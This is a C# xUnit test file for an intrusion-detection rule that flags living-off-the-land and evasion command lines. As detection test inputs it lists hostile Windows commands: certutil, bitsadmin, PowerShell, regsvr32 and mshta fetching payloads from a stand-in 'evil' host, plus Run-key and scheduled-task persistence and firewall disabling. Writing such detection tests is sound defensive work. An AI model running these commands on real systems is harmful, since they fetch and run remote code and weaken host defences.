using Xunit;
using Sentinel.Core;

namespace Sentinel.Tests
{
    /// <summary>
    /// Tests for IdsCommandLineRule (FEAT-002): LOLBin / evasion command-line patterns
    /// produce a Tier2 / LogOnly indicator; benign / empty / null command lines do not.
    /// </summary>
    public class IdsCommandLineRuleTests
    {
        private static FusedTelemetryContext MakeContext(string? commandLine)
        {
            return new FusedTelemetryContext
            {
                ProcessId = 1234,
                ProcessName = "test.exe",
                TriggeringEvent = new ProcessTelemetry
                {
                    ProcessName = "test.exe",
                    ProcessId = 1234,
                    ImagePath = @"C:\Windows\System32\test.exe",
                    CommandLine = commandLine ?? string.Empty
                }
            };
        }

        [Theory]
        [InlineData("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA")]
        [InlineData("powershell.exe -EncodedCommand ABCDEF")]
        [InlineData("certutil -urlcache -f http://evil/x payload.exe")]
        [InlineData("bitsadmin /transfer job http://evil/x c:\\x.exe")]
        [InlineData("powershell -w hidden -c whoami")]
        [InlineData("powershell -Command \"iex(New-Object Net.WebClient).DownloadString('http://evil')\"")]
        [InlineData("powershell -ExecutionPolicy Bypass -File x.ps1")]
        [InlineData("wmic process call create calc.exe")]
        [InlineData("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d evil.exe")]
        [InlineData("schtasks /create /tn evil /tr evil.exe")]
        [InlineData("netsh firewall set opmode disable")]
        [InlineData("sc create evilsvc binPath= c:\\evil.exe")]
        [InlineData("rundll32 c:\\temp\\evil.dll,EntryPoint")]
        [InlineData("regsvr32 /s /u /i:http://evil/x.sct scrobj.dll")]
        [InlineData("mshta http://evil/x.hta")]
        public void MaliciousCommandLine_ReturnsTier2LogOnly(string cmd)
        {
            var rule = new IdsCommandLineRule();
            var result = rule.Evaluate(MakeContext(cmd));

            Assert.NotNull(result);
            Assert.Equal(DetectionTier.Tier2Indicator, result!.Tier);
            Assert.Equal(ResponseAction.LogOnly, result.AuthorizedResponse);
            Assert.False(result.KillAuthorized);
        }

        [Theory]
        [InlineData("notepad.exe C:\\Users\\x\\doc.txt")]
        [InlineData("explorer.exe")]
        [InlineData("chrome.exe --profile-directory=Default")]
        public void BenignCommandLine_ReturnsNull(string cmd)
        {
            var rule = new IdsCommandLineRule();
            Assert.Null(rule.Evaluate(MakeContext(cmd)));
        }

        [Fact]
        public void EmptyCommandLine_ReturnsNull()
        {
            var rule = new IdsCommandLineRule();
            Assert.Null(rule.Evaluate(MakeContext(string.Empty)));
        }

        [Fact]
        public void NullCommandLine_ReturnsNull()
        {
            var rule = new IdsCommandLineRule();
            Assert.Null(rule.Evaluate(MakeContext(null)));
        }

        [Fact]
        public void NonProcessTriggeringEvent_ReturnsNull()
        {
            var rule = new IdsCommandLineRule();
            var ctx = new FusedTelemetryContext
            {
                ProcessId = 1,
                ProcessName = "x",
                TriggeringEvent = new FileActivityTelemetry { ProcessName = "x", ProcessId = 1 }
            };
            Assert.Null(rule.Evaluate(ctx));
        }
    }
}
